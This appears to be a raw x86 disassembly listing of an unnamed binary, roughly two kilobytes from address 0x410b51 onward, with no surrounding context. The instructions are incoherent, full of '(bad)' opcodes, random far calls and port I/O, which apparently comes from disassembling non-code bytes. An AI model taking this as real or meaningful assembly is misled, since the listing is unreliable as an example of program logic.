  410b51:	arpl   WORD PTR [eax],sp
  410b53:	push   esp
  410b54:	adc    al,0xdb
  410b56:	cmp    BYTE PTR [edx-0x29],dh
  410b59:	loopne 0x410b01
  410b5b:	in     eax,0x8a
  410b5d:	pop    edx
  410b5e:	jp     0x410b66
  410b60:	cs push esp
  410b62:	in     eax,0x6a
  410b64:	retf   0xd1bd
  410b67:	ins    BYTE PTR es:[edi],dx
  410b68:	add    DWORD PTR [eax+0x3a],edi
  410b6b:	adc    dl,0x34
  410b6e:	ins    DWORD PTR es:[edi],dx
  410b6f:	loope  0x410b04
  410b71:	mov    ecx,0x9f4a0380
  410b76:	push   ss
  410b77:	pop    esi
  410b78:	sub    cl,dl
  410b7a:	push   ebp
  410b7b:	jmp    0x410bfc
  410b7d:	std    
  410b7e:	xchg   esi,eax
  410b7f:	jecxz  0x410bed
  410b81:	pop    ebx
  410b82:	cwde   
  410b83:	jmp    0xf67e7d2d
  410b88:	jle    0x410bde
  410b8a:	(bad)  
  410b8b:	fwait
  410b8c:	cmp    al,0x75
  410b8e:	xchg   DWORD PTR [esi-0x68ce0d48],esi
  410b94:	inc    edx
  410b95:	adc    eax,0x2becbcce
  410b9a:	loope  0x410bbe
  410b9c:	sbb    al,0xce
  410b9e:	push   ss
  410b9f:	jp     0x410ba6
  410ba1:	aam    0xd4
  410ba3:	push   esi
  410ba4:	cs pop ds
  410ba6:	loopne 0x410b4c
  410ba8:	fdivr  st(3),st
  410baa:	cmp    esi,DWORD PTR [ebp+esi*2+0x36]
  410bae:	call   0xc603:0x1362f042
  410bb5:	or     eax,ebx
  410bb7:	fs retf 
  410bb9:	int    0xf5
  410bbb:	sub    al,0xe5
  410bbd:	sbb    al,BYTE PTR [esi+0x58]
  410bc0:	mov    cl,0x4b
  410bc2:	ret    0xa15
  410bc5:	cmp    BYTE PTR [ecx-0x19693188],bh
  410bcb:	xchg   ebp,eax
  410bcc:	call   0x2a36:0x47b9c348
  410bd3:	adc    BYTE PTR [esi],0x82
  410bd6:	sub    eax,0x9f36ee7b
  410bdb:	mov    esi,0xa3dd012e
  410be0:	mov    dh,0x69
  410be2:	mov    esp,0x1948cf26
  410be7:	add    al,0xf6
  410be9:	or     edi,edx
  410beb:	mov    dl,0x91
  410bed:	inc    edx
  410bee:	mov    ch,0x4f
  410bf0:	add    DWORD PTR [ebp+eax*1-0x4099af07],ecx
  410bf7:	push   ebp
  410bf8:	jmp    0x410bdf
  410bfa:	into   
  410bfb:	add    eax,0x12199e88
  410c00:	out    dx,al
  410c01:	jmp    0x9a06:0x8e2e3c1
  410c08:	and    al,dh
  410c0a:	jae    0x410be7
  410c0c:	ds lahf 
  410c0e:	imul   eax,edx,0x499b5464
  410c14:	xor    BYTE PTR [ebx+0x24],al
  410c17:	dec    eax
  410c18:	iret   
  410c19:	pop    ds
  410c1a:	mov    ecx,DWORD PTR [ecx]
  410c1c:	push   cs
  410c1d:	sub    eax,0x78eaf4a2
  410c22:	add    ch,ah
  410c24:	mov    ah,0x1d
  410c26:	imul   ebx,DWORD PTR [ebx],0xffffff98
  410c29:	inc    esp
  410c2a:	lods   eax,DWORD PTR ds:[esi]
  410c2b:	pop    ebp
  410c2c:	fisttp WORD PTR [ecx-0x22b923b7]
  410c32:	out    0x64,eax
  410c34:	mov    DWORD PTR [eax-0x49208358],eax
  410c3a:	or     al,0xd5
  410c3c:	das    
  410c3d:	call   0xc87f:0x77d7be4e
  410c44:	mov    esi,0x4dfe23d1
  410c49:	inc    ecx
  410c4a:	add    al,BYTE PTR [esi]
  410c4c:	inc    esi
  410c4d:	bound  esi,QWORD PTR [eax-0x78b8d587]
  410c53:	sar    DWORD PTR [esi-0xf7d044f],cl
  410c59:	sbb    eax,0x4ad8a480
  410c5e:	ins    DWORD PTR es:[edi],dx
  410c5f:	sahf   
  410c60:	test   al,0xbd
  410c62:	mov    cl,cl
  410c64:	mov    al,0xd2
  410c66:	clc    
  410c67:	rep lods eax,DWORD PTR ds:[esi]
  410c69:	mov    esi,0x261da65f
  410c6e:	setl   dl
  410c71:	clc    
  410c72:	mov    ebp,esi
  410c74:	sub    DWORD PTR [esi-0x5c],esi
  410c77:	sub    eax,0x6025d450
  410c7c:	mov    fs,eax
  410c7e:	dec    ebx
  410c7f:	xchg   BYTE PTR [ebx],dl
  410c81:	popf   
  410c82:	iret   
  410c83:	popa   
  410c84:	in     al,0x38
  410c86:	or     eax,0xc9bf47e4
  410c8b:	out    0xa2,al
  410c8d:	pop    edx
  410c8f:	add    al,0xd4
  410c91:	push   ds
  410c92:	sbb    BYTE PTR [edx-0x47],0xe6
  410c96:	inc    esp
  410c97:	dec    ecx
  410c98:	xor    edi,ebp
  410c9a:	add    DWORD PTR ds:0x90bb1e97,esp
  410ca0:	ror    cl,cl
  410ca2:	adc    esp,DWORD PTR [ebp+0xde620bf]
  410ca8:	add    dl,ch
  410caa:	mov    dl,0x10
  410cac:	xchg   ebp,eax
  410cad:	test   BYTE PTR [edi+0x45],bh
  410cb0:	add    BYTE PTR [edi],0x31
  410cb3:	sbb    esi,esi
  410cb5:	outs   dx,DWORD PTR ds:[esi]
  410cb6:	fstp   QWORD PTR [eax-0x4a]
  410cb9:	(bad)  
  410cba:	outs   dx,DWORD PTR ds:[esi]
  410cbb:	cs cdq 
  410cbd:	push   edx
  410cbe:	aaa    
  410cbf:	jns    0x410c62
  410cc1:	sbb    ah,BYTE PTR [ebp+0x62820961]
  410cc7:	repnz retf 0xc067
  410ccb:	dec    ebx
  410ccc:	dec    esp
  410ccd:	mov    ebx,0xb9ad4344
  410cd2:	mov    dh,0x35
  410cd4:	push   ebx
  410cd5:	pusha  
  410cd6:	and    al,0x86
  410cd8:	jb     0x410c67
  410cda:	xchg   DWORD PTR [ecx-0x71fefc0f],ebx
  410ce0:	cmc    
  410ce1:	data16 adc cl,BYTE PTR [edx+0x77]
  410ce5:	xchg   BYTE PTR [eax+0x395180e8],ah
  410ceb:	mov    al,0x92
  410ced:	xchg   ebp,eax
  410cee:	xor    eax,DWORD PTR [esi-0x272a364d]
  410cf4:	pop    DWORD PTR [edi]
  410cf6:	lock sar BYTE PTR [edx+0x26],1
  410cfa:	loop   0x410d55
  410cfc:	pop    ebp
  410cfd:	pop    edx
  410cfe:	sub    edi,DWORD PTR [ebx+0x50106faa]
  410d04:	xchg   ecx,eax
  410d05:	in     al,0xbb
  410d07:	imul   ebx,DWORD PTR [eax+eax*2-0x5594a41a],0x69
  410d0f:	ds mov ah,0xe7
  410d12:	inc    eax
  410d13:	call   0xfc81:0x36737c80
  410d1a:	and    ch,bl
  410d1c:	xlat   BYTE PTR ds:[ebx]
  410d1d:	rcl    DWORD PTR [esi+0x42fa9545],0x39
  410d24:	cmp    eax,0xf8a21d54
  410d29:	add    dx,WORD PTR [edx]
  410d2c:	push   cs
  410d2d:	xor    esi,DWORD PTR [ebx]
  410d2f:	add    BYTE PTR [eax+0x25],bl
  410d32:	out    0xbe,al
  410d34:	xor    esp,DWORD PTR [esi+ebp*8]
  410d37:	inc    eax
  410d38:	mov    edi,DWORD PTR [eax-0x481210dd]
  410d3e:	aad    0x70
  410d40:	in     al,0x7e
  410d42:	mov    ds:0x7b65a31b,al
  410d47:	ret    
  410d48:	xchg   edx,eax
  410d49:	outs   dx,BYTE PTR ds:[esi]
  410d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d4b:	xor    BYTE PTR [ebx],bh
  410d4d:	mov    dh,0xaf
  410d4f:	pop    esi
  410d50:	pusha  
  410d51:	das    
  410d52:	leave  
  410d53:	sbb    bh,BYTE PTR ds:0xfdf1f64c
  410d59:	adc    al,BYTE PTR [eax]
  410d5b:	test   eax,0x7644faea
  410d60:	push   ebx
  410d61:	mov    dl,0x87
  410d63:	mov    DWORD PTR [esi-0x73],0xb1a69439
  410d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d6b:	test   BYTE PTR [ebx+edx*2-0x7f42b05d],bh
  410d72:	outs   dx,BYTE PTR ds:[esi]
  410d73:	ror    BYTE PTR ds:0xd31eeff4,0xb9
  410d7a:	cmc    
  410d7b:	xchg   DWORD PTR [ebx],ebp
  410d7d:	pop    eax
  410d7e:	pop    eax
  410d7f:	add    BYTE PTR fs:[ebp+0x7543bdd1],ch
  410d86:	dec    esp
  410d87:	push   ebx
  410d88:	cwde   
  410d89:	sub    edx,DWORD PTR [edi-0x3d]
  410d8c:	push   ds
  410d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d8e:	test   al,0x39
  410d90:	jle    0x410db7
  410d92:	pop    ss
  410d93:	push   cs
  410d94:	ffree  st(2)
  410d96:	mov    bl,0x75
  410d98:	pusha  
  410d99:	add    dl,BYTE PTR [ebx-0x1d]
  410d9c:	std    
  410d9d:	inc    DWORD PTR [eax+esi*8+0x6addc199]
  410da4:	(bad)  
  410da5:	xchg   edi,eax
  410da6:	push   ecx
  410da7:	(bad)  
  410da8:	test   eax,0xb1c6afad
  410dad:	cmp    BYTE PTR [edi+0x16bbf7fc],ah
  410db3:	fs (bad) 
  410db6:	in     al,0xbe
  410db8:	or     ah,BYTE PTR [edx+edi*1-0x7e]
  410dbc:	in     al,0x63
  410dbe:	ja     0x410daf
  410dc0:	sub    DWORD PTR [edi],esi
  410dc2:	loopne 0x410dff
  410dc4:	fild   QWORD PTR [ecx]
  410dc6:	mov    ah,0x39
  410dc8:	jbe    0x410e46
  410dca:	inc    edx
  410dcb:	inc    eax
  410dcc:	sub    eax,0x3f5012cf
  410dd1:	xchg   DWORD PTR [ebx+0x51],esi
  410dd4:	mov    edx,DWORD PTR [ebp-0x2bfacbc4]
  410dda:	icebp  
  410ddb:	dec    ecx
  410ddc:	sub    eax,0xb8188e10
  410de1:	xchg   ebx,eax
  410de2:	pop    ss
  410de3:	push   ebx
  410de4:	push   esi
  410de5:	mov    ds,WORD PTR [esi+0x48]
  410de8:	jg     0x410e3a
  410dea:	stc    
  410deb:	fdiv   st(0),st
  410ded:	xor    DWORD PTR [ebx+0x5d],ecx
  410df0:	iret   
  410df1:	outs   dx,BYTE PTR ds:[esi]
  410df2:	sub    DWORD PTR [edi+0x3665f0a3],esi
  410df8:	das    
  410df9:	ror    DWORD PTR [ebx+0x114134c2],0xf
  410e00:	scas   eax,DWORD PTR es:[edi]
  410e01:	loopne 0x410dd0
  410e03:	mov    ah,0x6d
  410e05:	mov    bl,0x80
  410e07:	inc    ebp
  410e08:	lahf   
  410e09:	mov    ds:0x93bf4302,al
  410e0e:	push   es
  410e0f:	fwait
  410e10:	push   edx
  410e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e12:	xor    dl,BYTE PTR [ecx+0x7d43ec50]
  410e18:	push   esi
  410e19:	mov    DWORD PTR [ecx+0xf9da476],edi
  410e1f:	dec    ecx
  410e20:	hlt    
  410e21:	sbb    dl,BYTE PTR [edx+0x6a4c62a3]
  410e27:	xchg   ebx,eax
  410e28:	cmc    
  410e29:	cli    
  410e2a:	rcr    DWORD PTR [eax+0xf99c1f8],1
  410e30:	mov    esi,?
  410e32:	scas   al,BYTE PTR es:[edi]
  410e33:	sub    dh,BYTE PTR [ebp+0x3a]
  410e36:	in     eax,0x2e
  410e38:	sahf   
  410e39:	xchg   DWORD PTR [ebx-0x7a],esp
  410e3c:	jp     0x410e95
  410e3e:	cdq    
  410e3f:	aam    0x11
  410e41:	sbb    BYTE PTR [eax-0x4a],dl
  410e44:	or     eax,0xbb73d817
  410e49:	push   eax
  410e4a:	cwde   
  410e4b:	mov    bl,0xee
  410e4d:	nop
  410e4e:	mov    ebx,DWORD PTR [edx+0x3d64524]
  410e54:	inc    ebp
  410e55:	and    BYTE PTR [edx+0x68],dh
  410e58:	xchg   ecx,eax
  410e59:	int    0xa6
  410e5b:	jae    0x410ebf
  410e5d:	or     dh,0x1
  410e60:	mov    esp,0x16a87ef6
  410e65:	dec    edx
  410e66:	and    ah,BYTE PTR [esi-0x57]
  410e69:	mov    al,ds:0xd88cf09b
  410e6e:	rcl    DWORD PTR [esi+0x75d6dcbd],cl
  410e74:	push   es
  410e75:	mov    al,ds:0x4e9b4ab1
  410e7a:	popf   
  410e7b:	int3   
  410e7c:	cld    
  410e7d:	jns    0x410e27
  410e7f:	ja     0x410ead
  410e81:	xor    bh,BYTE PTR [ebp+0x7f]
  410e84:	jmp    0x410ed4
  410e86:	ins    BYTE PTR es:[edi],dx
  410e87:	mov    bl,0x51
  410e89:	out    0xc7,eax
  410e8b:	sbb    eax,0x89e5012
  410e90:	test   DWORD PTR [eax+0x12],0x8db1c2d6
  410e97:	stc    
  410e98:	(bad)  
  410e99:	retf   
  410e9a:	ror    cl,0xc9
  410e9d:	add    BYTE PTR [edi-0x6a],al
  410ea0:	cmp    al,0xba
  410ea2:	adc    ebx,DWORD PTR ds:0xa392578f
  410ea8:	test   BYTE PTR [edx+0x42c253b3],bh
  410eae:	jnp    0x410f17
  410eb0:	sbb    al,0x1b
  410eb2:	xchg   edx,eax
  410eb3:	loopne 0x410ecf
  410eb5:	pushw  0xb6fa
  410eb9:	adc    edi,DWORD PTR [esi+edx*2-0x5b41ca35]
  410ec0:	in     eax,0xb9
  410ec2:	in     eax,0xcb
  410ec4:	retf   0x4be0
  410ec7:	dec    eax
  410ec8:	icebp  
  410ec9:	fisubr WORD PTR [edx-0x36]
  410ecc:	add    bl,BYTE PTR [eax]
  410ece:	adc    DWORD PTR [eax+0x28],0x20
  410ed2:	xchg   edi,eax
  410ed3:	cmp    al,0xd3
  410ed5:	and    edi,edi
  410ed7:	dec    edx
  410ed8:	inc    ebx
  410ed9:	fst    DWORD PTR [edi-0x6de02930]
  410edf:	mov    dh,0xca
  410ee1:	jmp    DWORD PTR [edi]
  410ee3:	mov    eax,ds:0xda4408dc
  410ee8:	inc    esp
  410ee9:	jmp    ecx
  410eeb:	shr    cl,cl
  410eed:	mov    ss,WORD PTR ds:0x86f61cc7
  410ef3:	cs sti 
  410ef5:	bound  esi,QWORD PTR [eax+0x3a4f29e4]
  410efb:	sbb    eax,0xe204bcf4
  410f00:	or     al,BYTE PTR [esi+0x302f2998]
  410f06:	mov    ds:0xaf4fbd8,eax
  410f0b:	jl     0x410eb7
  410f0d:	and    al,0x71
  410f0f:	xor    ch,bl
  410f11:	sbb    DWORD PTR [ecx+0x4a],ecx
  410f14:	xchg   edi,eax
  410f15:	jmp    0x410eb8
  410f17:	dec    ebp
  410f18:	or     bl,0x91
  410f1b:	push   esp
  410f1c:	fld    TBYTE PTR [edi-0xdadc8e6]
  410f22:	mov    al,ds:0xf293375d
  410f27:	cmp    eax,0x4e0ade2a
  410f2c:	data16 int3 
  410f2e:	pop    es
  410f2f:	jl     0x410faf
  410f31:	repnz add ah,BYTE PTR [edi]
  410f34:	cmp    esi,0xfffffffe
  410f37:	or     esi,esp
  410f39:	pop    esp
  410f3a:	retf   0x7de
  410f3d:	daa    
  410f3e:	fdivr  st,st(2)
  410f40:	jae    0x410f80
  410f42:	call   0x3c04:0xdd73041c
  410f49:	dec    esi
  410f4a:	dec    edi
  410f4b:	mov    edi,cs
  410f4d:	sbb    BYTE PTR [ecx-0x11],cl
  410f50:	xchg   BYTE PTR [edx-0x54],bh
  410f53:	mov    eax,ds:0xd431e553
  410f58:	xlat   BYTE PTR ds:[ebx]
  410f59:	sub    esp,ecx
  410f5b:	jns    0x410edf
  410f5d:	push   0x1d79d6d2
  410f62:	sti    
  410f63:	sub    bx,WORD PTR [esi+0x3c005564]
  410f6a:	xchg   ebp,eax
  410f6b:	dec    ebx
  410f6c:	bound  esp,QWORD PTR [ebx]
  410f6e:	(bad)  
  410f70:	mov    eax,0x51870d68
  410f75:	pusha  
  410f76:	mov    eax,gs:0x902ea10
  410f7c:	jns    0x410fe5
  410f7e:	dec    edi
  410f7f:	int    0x96
  410f81:	inc    esi
  410f82:	popf   
  410f83:	xchg   ebx,eax
  410f84:	push   esi
  410f85:	fwait
  410f86:	mov    eax,0x8d17f62b
  410f8b:	mov    ds:0x17f79acd,al
  410f90:	or     DWORD PTR [eax],esi
  410f92:	(bad)  
  410f93:	imul   cl
  410f95:	fnstsw WORD PTR [ebx+0x538689db]
  410f9b:	pop    es
  410f9c:	cmp    ah,BYTE PTR [edx-0x2d]
  410f9f:	shl    dl,cl
  410fa1:	outs   dx,DWORD PTR ds:[esi]
  410fa2:	xor    al,0x4a
  410fa4:	mov    bl,0x8f
  410fa6:	or     cl,BYTE PTR [ebx]
  410fa8:	lods   eax,DWORD PTR ds:[esi]
  410fa9:	adc    eax,0x534a4289
  410fae:	in     al,dx
  410faf:	ds ss sahf 
  410fb2:	int3   
  410fb3:	or     ecx,ecx
  410fb5:	arpl   bx,dx
  410fb7:	ret    0x1f1e
  410fba:	jmp    0xf808182b
  410fbf:	xchg   edi,eax
  410fc0:	pusha  
  410fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fc2:	cli    
  410fc3:	aas    
  410fc4:	inc    ecx
  410fc5:	arpl   WORD PTR [esi-0x6a],dx
  410fc8:	adc    eax,0xc3853f36
  410fcd:	scas   al,BYTE PTR es:[edi]
  410fce:	ja     0x410fdc
  410fd0:	jg     0x410fd3
  410fd2:	aas    
  410fd3:	sbb    DWORD PTR [edx],esi
  410fd5:	xchg   esp,eax
  410fd6:	loop   0x410ff1
  410fd8:	or     DWORD PTR [edx+0x3f],edi
  410fdb:	pop    edx
  410fdc:	add    edx,DWORD PTR [edx-0x6]
  410fdf:	xor    BYTE PTR [ecx-0x2d4d3448],al
  410fe5:	sub    eax,0x1ec58dd9
  410fea:	daa    
  410feb:	icebp  
  410fec:	test   BYTE PTR [edx+0x61],bh
  410fef:	xchg   edx,eax
  410ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ff1:	add    dl,BYTE PTR [eax+ecx*4]
  410ff4:	dec    edi
  410ff5:	sub    BYTE PTR [esi+0x5e],bh
  410ff8:	xlat   BYTE PTR ds:[ebx]
  410ff9:	cwde   
  410ffa:	repz aad 0x9
  410ffd:	in     al,dx
  410ffe:	(bad)  
  410fff:	adc    eax,0x36d7c2c1
  411004:	ins    BYTE PTR es:[edi],dx
  411005:	xchg   DWORD PTR [esi-0x1d],ebx
  411008:	or     eax,0x2fbf12ee
  41100d:	dec    ebp
  41100e:	mov    ecx,0xfc1f0a87
  411013:	push   ds
  411014:	rcl    ah,0x7c
  411017:	inc    esp
  411018:	daa    
  411019:	std    
  41101a:	jg     0x411030
  41101c:	in     al,dx
  41101d:	sub    BYTE PTR [ecx-0x1dc264bd],0xa3
  411024:	push   ds
  411025:	outs   dx,BYTE PTR ds:[esi]
  411026:	(bad)  
  411027:	jmp    0xd7ac:0x22441445
  41102e:	outs   dx,DWORD PTR ds:[esi]
  41102f:	fst    QWORD PTR [ecx-0x16]
  411032:	pop    ss
  411033:	nop
  411034:	mov    al,0x7f
  411036:	jo     0x4110ac
  411038:	pop    ecx
  411039:	dec    ebx
  41103a:	fsub   st,st(0)
  41103c:	arpl   WORD PTR [esi],ax
  41103e:	js     0x411056
  411040:	mov    fs,WORD PTR [esi+0x19]
  411043:	mov    bh,0xae
  411045:	jmp    DWORD PTR [ecx+0x4eb53a9c]
  41104b:	call   0x7a1234b9
  411050:	xchg   ebp,eax
  411051:	dec    eax
  411052:	mov    al,ds:0xc6eec88e
  411057:	or     DWORD PTR [ecx],edi
  411059:	lods   eax,DWORD PTR ds:[esi]
  41105a:	or     BYTE PTR [edi+0x109f2a18],ch
  411060:	mov    dh,0x1a
  411062:	pushf  
  411063:	pop    ebp
  411064:	mov    edi,0xee062355
  411069:	jb     0x410ff3
  41106b:	loop   0x41107c
  41106d:	adc    edx,DWORD PTR [edx-0x66f48fb8]
  411073:	mov    eax,0x1a076f4e
  411078:	jno    0x4110f2
  41107a:	adc    eax,0xc2bc61ab
  41107f:	xor    ebp,eax
  411081:	mov    fs,WORD PTR [bx+di-0x78f3]
  411086:	sub    dh,dh
  411088:	fcomp  DWORD PTR [esi-0x65cd7e62]
  41108e:	fbstp  TBYTE PTR [ebx+esi*4-0x74]
  411092:	dec    esp
  411093:	lea    ebp,[eax+0x73]
  411096:	clc    
  411097:	stc    
  411098:	add    eax,0xfc3e2bdb
  41109d:	out    dx,al
  41109e:	in     eax,dx
  41109f:	iret   
  4110a0:	inc    bl
  4110a2:	(bad)  
  4110a4:	test   dl,ch
  4110a6:	ins    DWORD PTR es:[edi],dx
  4110a7:	adc    ecx,DWORD PTR [ecx-0xa]
  4110aa:	adc    BYTE PTR [esp+ecx*1-0x7c],ch
  4110ae:	inc    esp
  4110af:	inc    eax
  4110b0:	cmp    al,0xe4
  4110b2:	sub    DWORD PTR [edx],0x63
  4110b5:	pop    esp
  4110b6:	or     ebx,DWORD PTR ds:0xc88cb4a9
  4110bc:	cmp    al,0x3f
  4110be:	sbb    edi,ebp
  4110c0:	in     al,0xa4
  4110c2:	pop    esi
  4110c3:	aam    0x98
  4110c5:	lods   al,BYTE PTR ds:[esi]
  4110c6:	inc    ecx
  4110c7:	adc    eax,0x17b3a1de
  4110cc:	xchg   esi,eax
  4110cd:	mov    al,ds:0xa147e6cc
  4110d2:	sbb    esi,ebp
  4110d4:	mov    edi,0x2800571
  4110d9:	push   ecx
  4110da:	mov    eax,ds:0xc5a2e0fc
  4110df:	inc    esi
  4110e0:	mov    bl,0x1b
  4110e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110e3:	jl     0x4110fc
  4110e5:	xor    al,0xfe
  4110e7:	xchg   edi,eax
  4110e8:	xchg   ebp,eax
  4110e9:	cmp    dh,BYTE PTR [eax+0x50]
  4110ec:	sbb    cl,BYTE PTR [edi]
  4110ee:	test   dl,bl
  4110f0:	pop    ebp
  4110f1:	mov    DWORD PTR [esi],esi
  4110f3:	xchg   ebp,eax
  4110f4:	sbb    cl,BYTE PTR [edi-0x3]
  4110f7:	jne    0x411160
  4110f9:	add    bh,BYTE PTR [eax-0x46cb6f15]
  4110ff:	cdq    
  411100:	pop    es
  411101:	xor    eax,0x209c0a61
  411106:	xor    DWORD PTR [ebx],eax
  411108:	dec    ecx
  411109:	bound  edi,QWORD PTR [ebx]
  41110b:	xor    BYTE PTR [eax-0x3af9272b],0x46
  411112:	ss mov edi,0x8f525629
  411118:	pop    eax
  411119:	and    ebx,DWORD PTR [ebx]
  41111b:	mov    dl,0x17
  41111d:	retf   
  41111e:	repz sbb BYTE PTR [eax+0xe],bl
  411122:	stos   BYTE PTR es:[edi],al
  411123:	std    
  411124:	sbb    dh,bl
  411126:	retw   0x38cf
  41112a:	push   ds
  41112b:	jecxz  0x411150
  41112d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112e:	xor    eax,0x8c16c351
  411133:	pop    ss
  411134:	ins    BYTE PTR es:[edi],dx
  411135:	jb     0x411162
  411137:	push   eax
  411138:	push   esi
  411139:	dec    edi
  41113a:	and    eax,0x106b311
  41113f:	cmp    BYTE PTR ds:0x88c7fd42,0xa9
  411146:	jle    0x41110a
  411148:	ins    DWORD PTR es:[edi],dx
  411149:	pop    edx
  41114a:	xchg   ebx,eax
  41114b:	(bad)  
  41114c:	xor    eax,0xabba83c4
  411151:	sub    BYTE PTR [esi],bh
  411153:	adc    ebp,DWORD PTR [esi-0x64]
  411156:	daa    
  411157:	sbb    esi,DWORD PTR ds:0x21cefe9d
  41115d:	pop    ebx
  41115e:	lahf   
  41115f:	call   0xd355:0x527a30f0
  411166:	test   al,0xa3
  411168:	cmp    bl,BYTE PTR [ebx-0x7c]
  41116b:	stc    
  41116c:	pop    esp
  41116d:	mov    bh,0xd2
  41116f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411170:	pop    ss
  411171:	(bad)  [edx+edi*2]
  411174:	push   edi
  411175:	pop    ebp
  411176:	mov    edi,esp
  411178:	call   0x35dd09a7
  41117d:	push   esp
  41117e:	and    ebp,DWORD PTR [esp+ecx*8]
  411181:	push   0x5ac77afa
  411186:	into   
  411187:	jae    0x411190
  411189:	and    DWORD PTR [ebx-0x4d65fad7],ebx
  41118f:	pop    ss
  411190:	js     0x41111b
  411192:	mov    al,0x3f
  411194:	adc    ecx,esp
  411196:	ds fs es or bl,0x2b
  41119c:	clc    
  41119d:	mov    eax,ds:0x2329c026
  4111a2:	leavew 
  4111a4:	cmp    esi,DWORD PTR [ecx]
  4111a6:	jo     0x41121e
  4111a8:	stos   DWORD PTR es:[edi],eax
  4111a9:	xchg   edi,eax
  4111aa:	test   ebp,esi
  4111ac:	mov    ebx,0xf3ce2867
  4111b1:	dec    edx
  4111b2:	mov    edx,0x63f36a9b
  4111b7:	dec    edi
  4111b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b9:	cmp    dl,BYTE PTR [eax-0x3703ec3]
  4111bf:	(bad)  
  4111c1:	add    al,0x64
  4111c3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4111c5:	push   ebx
  4111c6:	jnp    0x41120f
  4111c8:	ins    DWORD PTR es:[edi],dx
  4111c9:	or     BYTE PTR [ebp-0x3476a550],0xbc
  4111d0:	repnz (bad) 
  4111d2:	pop    ebp
  4111d3:	in     al,0x1e
  4111d5:	mov    DWORD PTR [edx+edx*1+0x109e47d8],esp
  4111dc:	xor    DWORD PTR [edi-0x12],0xf41b3cfe
  4111e3:	mov    esi,0x9d51311f
  4111e8:	fist   DWORD PTR [ebp-0x24aa9dc4]
  4111ee:	and    ebp,ecx
  4111f0:	(bad)  
  4111f1:	xor    ch,bl
  4111f3:	cmp    cl,ch
  4111f5:	ret    0xecab
  4111f8:	jl     0x411205
  4111fa:	imul   eax,ebx,0xffffffc3
  4111fd:	xor    edi,esi
  4111ff:	ftst   
  411201:	loope  0x41121a
  411203:	push   esi
  411204:	cmc    
  411205:	daa    
  411206:	cmp    cl,bl
  411208:	push   0x59a48589
  41120d:	cwde   
  41120e:	mov    edx,0xe8e5f837
  411213:	jo     0x4111ef
  411215:	in     eax,dx
  411216:	xchg   esp,eax
  411217:	lods   eax,DWORD PTR ds:[esi]
  411218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411219:	sbb    edi,DWORD PTR [esi+0x40c4bcbe]
  41121f:	dec    edx
  411220:	dec    edi
  411221:	sti    
  411222:	mov    eax,ebp
  411224:	lahf   
  411225:	enter  0xebfc,0x11
  411229:	push   ebx
  41122a:	or     al,0x68
  41122c:	sub    cl,cl
  41122e:	jno    0x4111c2
  411230:	mov    dl,0xd1
  411232:	dec    ebx
  411233:	aad    0x41
  411235:	loopne 0x41126c
  411237:	pop    ds
  411238:	jmp    0xd3a0:0xb7aa01f8
  41123f:	call   DWORD PTR [edi]
  411241:	mov    esp,0x5ee5c26a
  411246:	pop    esp
  411247:	(bad)  
  411249:	xchg   BYTE PTR [eax+0x6],ch
  41124c:	dec    eax
  41124d:	js     0x4111ed
  41124f:	mov    ebp,0x8c8dd89d
  411254:	dec    edx
  411255:	push   ss
  411256:	jns    0x411225
  411258:	sub    bh,dl
  41125a:	dec    esp
  41125b:	bound  edi,QWORD PTR [eax-0x23]
  41125e:	mov    dl,0xd0
  411260:	fcom   DWORD PTR [ebp+esi*4+0x2d]
  411264:	push   esp
  411265:	outs   dx,BYTE PTR ds:[esi]
  411266:	mov    al,ds:0xf1a5cbaf
  41126b:	nop
  41126c:	mov    DWORD PTR [edx-0x6291bdaa],ebx
  411272:	mov    esp,DWORD PTR [esi]
  411274:	daa    
  411275:	sub    bh,ah
  411277:	xor    BYTE PTR [eax+edx*4],bh
  41127a:	pop    esi
  41127b:	mov    bh,0xf8
  41127d:	outs   dx,BYTE PTR ds:[esi]
  41127e:	(bad)  
  41127f:	fwait
  411280:	addr16 popa 
  411282:	cmp    al,0x95
  411284:	sub    DWORD PTR [eax+0x3d43c40a],ecx
  41128a:	add    eax,0xb765e374
  41128f:	lods   eax,DWORD PTR ds:[esi]
  411290:	cmc    
  411291:	mov    edi,0xd03a45e1
  411296:	or     al,0x24
  411298:	adc    edx,ebp
  41129a:	ds (bad) 
  41129c:	out    0x26,al
  41129e:	and    dh,BYTE PTR [ecx]
  4112a0:	aad    0xf9
  4112a2:	int    0x7f
  4112a4:	ins    DWORD PTR es:[edi],dx
  4112a5:	add    al,0x6b
  4112a7:	xchg   DWORD PTR [ecx-0x71c3bc56],eax
  4112ad:	push   ss
  4112ae:	mov    bh,0xcd
  4112b0:	clc    
  4112b1:	push   0x2850cad2
  4112b6:	or     esp,DWORD PTR [ecx-0x7528c939]
  4112bc:	jne    0x411310
  4112be:	and    BYTE PTR [esi],dh
  4112c0:	sub    BYTE PTR [esi-0x25],0x5e
  4112c4:	mov    eax,0x5091aab9
  4112c9:	(bad)  
  4112ca:	sbb    ah,dl
  4112cc:	in     al,0x78
  4112ce:	pop    ebx
  4112cf:	jbe    0x4112dd
  4112d1:	js     0x41126b
  4112d3:	jbe    0x411291
  4112d5:	xlat   BYTE PTR ds:[ebx]
  4112d6:	and    ecx,ebx
  4112d8:	idiv   BYTE PTR [ecx-0x37f0629]
  4112de:	or     bl,BYTE PTR [esi+0x19d7962c]
  4112e4:	or     al,0x73
  4112e6:	mov    ah,0x88
  4112e8:	and    ebx,DWORD PTR ds:0xabcae5cd
  4112ee:	les    eax,FWORD PTR ds:0xb2507a1b
  4112f4:	jne    0x4112f8
  4112f6:	mov    ebp,0x9a589737
  4112fb:	aad    0x88
  4112fd:	fistp  DWORD PTR [ebx-0x1b7b3edd]
  411303:	(bad)  
  411305:	push   0x225ff75d
  41130a:	mov    edx,0xf25584ca
  41130f:	int    0xff
  411311:	aad    0xda
  411313:	(bad)  [ebp-0x4f]
